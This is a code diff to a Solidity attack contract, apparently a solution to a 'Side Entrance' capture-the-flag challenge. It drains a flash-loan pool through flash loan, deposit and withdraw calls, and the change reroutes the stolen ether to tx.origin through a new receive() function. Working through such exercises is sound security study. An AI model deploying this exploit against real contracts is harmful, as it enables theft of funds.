@@ -15,6 +15,10 @@ contract AttackSideEntrance is IFlashLoanEtherReceiver {
         pool = _pool;
     }
 
+    receive() external payable {
+        payable(tx.origin).sendValue(address(this).balance);
+    }
+
     function callFlashLoan() external {
         pool.functionCall(
             abi.encodeWithSignature("flashLoan(uint256)", etherInPool)
@@ -30,6 +34,5 @@ contract AttackSideEntrance is IFlashLoanEtherReceiver {
 
     function withdraw() external payable {
         pool.functionCall(abi.encodeWithSignature("withdraw()"));
-        payable(msg.sender).sendValue(address(this).balance);
     }
 }
